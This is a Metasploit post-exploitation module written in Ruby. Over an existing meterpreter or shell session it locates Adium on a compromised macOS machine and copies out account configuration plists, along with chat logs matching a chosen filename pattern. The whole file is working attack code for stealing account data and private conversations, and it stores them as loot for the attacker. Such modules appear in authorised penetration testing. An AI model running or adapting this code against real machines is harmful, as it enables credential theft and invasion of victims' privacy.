##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OS X Gather Adium Enumeration',
      'Description'   => %q{
          This module will collect Adium's account plist files and chat logs from the
        victim's machine.  There are three different actions you may choose: ACCOUNTS,
        CHATS, and ALL.  Note that to use the 'CHATS' action, make sure you set the regex
        'PATTERN' option in order to look for certain log names (which consists of a
        contact's name, and a timestamp).  The current 'PATTERN' option is configured to
        look for any log created on February 2012 as an example.  To loot both account
        plists and chat logs, simply set the action to 'ALL'.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ "meterpreter", "shell" ],
      'Actions'       =>
        [
          ['ACCOUNTS', { 'Description' => 'Collect account-related plists' } ],
          ['CHATS',    { 'Description' => 'Collect chat logs with a pattern' } ],
          ['ALL',      { 'Description' => 'Collect both account plists and chat logs'}]
        ],
      'DefaultAction' => 'ALL'
    ))

    register_options(
      [
        OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\'s filename', '\(2012\-02\-.+\)\.xml$']),
      ])
  end

  #
  # Parse a plst file to XML format:
  # http://hints.macworld.com/article.php?story=20050430105126392
  #
  def plutil(filename)
    exec("plutil -convert xml1 #{filename}")
    data = exec("cat #{filename}")
    return data
  end

  #
  # Collect logs files.
  # Enumerate all the xml files (logs), filter out the ones we want, and then
  # save each in a hash.
  #
  def get_chatlogs(base)
    base = "#{base}Logs/"

    #
    # Find all the chat folders for all the victim's contacts and groups
    #
    print_status("#{@peer} - Gathering folders for chatlogs...")
    targets = []
    dir(base).each do |account|
      dir("#{base}#{account}/").each do |contact|
        # Use 'find' to enumerate all the xml files
        base_path = "#{base}#{account}/#{contact}"
        logs = exec("find #{base_path} -name *.xml").split("\n")
        next if logs =~ /No such file or directory/

        # Filter out logs
        filtered_logs = []
        logs.each do |log|
          if log =~ datastore['PATTERN']
            # For debugging purposes, we print all the matches
            vprint_status("Match: #{log}")
            filtered_logs << log
          end
        end

        targets << {
          :account   => account,
          :contact   => contact,
          :log_paths => filtered_logs
        }
      end
    end

    #
    # Save all the logs to a folder
    #
    logs = []
    targets.each do |target|
      log_size = target[:log_paths].length
      contact  = target[:contact]
      account  = target[:account]

      # Nothing was actually downloaded, skip this one
      next if log_size == 0

      print_status("#{@peer} - Looting #{log_size.to_s} chats with #{contact} (#{account})")
      target[:log_paths].each do |log|
        log = "\"#{log}\""
        data = exec("cat #{log}")
        logs << {
          :account => account,
          :contact => contact,
          :data    => data
        }
        #break
      end
    end

    return logs
  end

  #
  # Get AccountPrefs.plist, Accounts.plist, AccountPrefs.plist.
  # Return: [ {:filename=> String, :data => String} ]
  #
  def get_account_info(base)
    files = [ "Account\\ Status.plist", "Accounts.plist", "AccountPrefs.plist" ]
    loot = []

    files.each do |file|
      #
      # Make a copy of the file we want to convert and steal
      #
      fpath = "#{base}#{file}"
      rand_name = "/tmp/#{Rex::Text.rand_text_alpha(5)}"
      tmp = exec("cp #{fpath} #{rand_name}")

      if tmp =~ /No such file or directory/
        print_error("#{@peer} - Not found: #{fpath}")
        next
      end

      #
      # Convert plist to xml
      #
      print_status("#{@peer} - Parsing: #{file}")
      xml = plutil(rand_name)

      #
      # Save data, and then clean up
      #
      if xml.empty?
        print_error("#{@peer} - Unalbe to parse: #{file}")
      else
        loot << {:filename => file, :data => xml}
        exec("rm #{rand_name}")
      end
    end

    return loot
  end

  #
  # Do a store_root on all the data collected.
  #
  def save(type, data)
    case type
    when :account
      data.each do |e|
        e[:filename] = e[:filename].gsub(/\\ /,'_')
        p = store_loot(
          "adium.account.config",
          "text/plain",
          session,
          e[:data],
          e[:filename])

        print_good("#{@peer} - #{e[:filename]} stored as: #{p}")
      end

    when :chatlogs
      data.each do |e|
        account = e[:account]
        contact = e[:contact]
        data    = e[:data]

        p = store_loot(
          "adium.chatlog",
          "text/plain",
          session,
          data,
          contact
        )

        print_good("#{@peer} - #{contact}'s (#{account}) chat log stored as: #{p}")
      end

    end
  end

  #
  # Get current username
  #
  def whoami
    exec("/usr/bin/whoami")
  end

  #
  # Return an array or directory names
  #
  def dir(path)
    subdirs = exec("ls -l #{path}")
    return [] if subdirs =~ /No such file or directory/
    items = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d\:]+\x20(.+)$/).flatten
    return items
  end

  #
  # This is just a wrapper for cmd_exec(), except it chomp() the output,
  # and retry under certain conditions.
  #
  def exec(cmd)
    begin
      out = cmd_exec(cmd).chomp
    rescue ::Timeout::Error => e
      vprint_error("#{@peer} - #{e.message} - retrying...")
      retry
    rescue EOFError => e
      vprint_error("#{@peer} - #{e.message} - retrying...")
      retry
    end
  end

  #
  # We're not sure the exact name of the folder becuase it contains a version number.
  # We'll just check every folder name, and whichever contains the word "Adium",
  # that's the one we'll use.
  #
  def locate_adium(base)
    dir(base).each do |folder|
      m = folder.match(/(Adium \d+\.\d+)$/)
      if m
        m = m[0].gsub(/\x20/, "\\\\ ") + "/"
        return "#{base}#{m}"
      end
    end

    return nil
  end

  def run
    #
    # Make sure there's an action name before we do anything
    #
    if action.nil?
      print_error("Please specify an action")
      return
    end

    @peer = "#{session.session_host}:#{session.session_port}"
    user = whoami

    #
    # Check adium.  And then set the default profile path
    #
    base = "/Users/#{user}/Library/Application\\ Support/"
    adium_path = locate_adium(base)
    if adium_path
      print_status("#{@peer} - Found adium: #{adium_path}")
      adium_path += "Users/Default/"
    else
      print_error("#{@peer} - Unable to find adium, will not continue")
      return
    end

    #
    # Now that adium is found, let's download some stuff
    #
    account_data = get_account_info(adium_path) if action.name =~ /ALL|ACCOUNTS/i
    chatlogs     = get_chatlogs(adium_path)     if action.name =~ /ALL|CHATS/i

    #
    # Store what we found on disk
    #
    save(:account, account_data) if not account_data.nil? and not account_data.empty?
    save(:chatlogs, chatlogs) if not chatlogs.nil? and not chatlogs.empty?
  end
end

=begin
Adium:
/Users/[username]/Library/Application\ Support/Adium\ 2.0/
=end
